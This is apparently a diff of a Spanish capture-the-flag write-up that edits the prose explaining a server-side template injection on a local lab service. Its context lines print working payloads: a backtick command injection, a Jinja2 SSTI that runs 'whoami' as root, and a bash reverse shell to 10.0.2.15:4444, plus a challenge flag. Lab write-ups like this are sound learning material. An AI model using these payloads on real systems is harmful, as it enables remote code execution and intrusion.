@@ -331,8 +331,7 @@ steve@reto02:~$ curl "http://127.0.0.1:7080/?ip=8.8.8.8`whoami`" | tail -n 20
     </html>
 
 ```
-SSTI
-
+Vulnerabilidad [SSTI (Server Side Template Injection)](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
 
 ```shell
 steve@reto02:~$ curl "http://127.0.0.1:7080/?ip=%7B%7B7*7%7D%7D"
@@ -420,10 +419,7 @@ steve@reto02:~$ curl "http://127.0.0.1:7080/?ip=%7B%7B7*7%7D%7D"
 
 ```
  
-nos devuelve el valor 49 
-
-
-con el siguiente **payload** observamos que nos da root 
+nos devuelve **49** en el `value` con lo que se reafirma la vulnerabilidad SSTI, procedemos a realizar otra prueba y con el siguiente **payload** observamos que nos da `root`, dándonos a saber que se ejecuta a través de root 
 
 ```bash
 steve@reto02:~$ curl "http://127.0.0.1:7080/?ip=%7B%7Bself._TemplateReference__context.cycler.__init__.__globals__.os.popen(%27whoami%27).read()%7D%7D"
@@ -512,7 +508,7 @@ steve@reto02:~$ curl "http://127.0.0.1:7080/?ip=%7B%7Bself._TemplateReference__c
 
 ```
 
-nos ponemos a escuchar por el puerto 4444 con el comando `nc -lvnp 44444` y con el siguiente **payload** 
+así que nos ponemos a escuchar por el puerto 4444 con el comando `nc -lvnp 44444` y con el siguiente **payload** lanzamos una shell
 
 ```shell
 curl "http://127.0.0.1:7080/?ip=%7B%7Bself._TemplateReference__context.cycler.__init__.__globals__.os.popen(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.0.2.15/4444%200%3E%261%22%27).read()%7D%7D"
@@ -554,7 +550,7 @@ HACK{BJ5gnYgLgTJRJDPsMEF2QC8SQ}
 
 ```
 
-Y tenemos la flag 3: `HACK{BJ5gnYgLgTJRJDPsMEF2QC8SQ}`
+**Flag 3:** `HACK{BJ5gnYgLgTJRJDPsMEF2QC8SQ}`
 
 
 
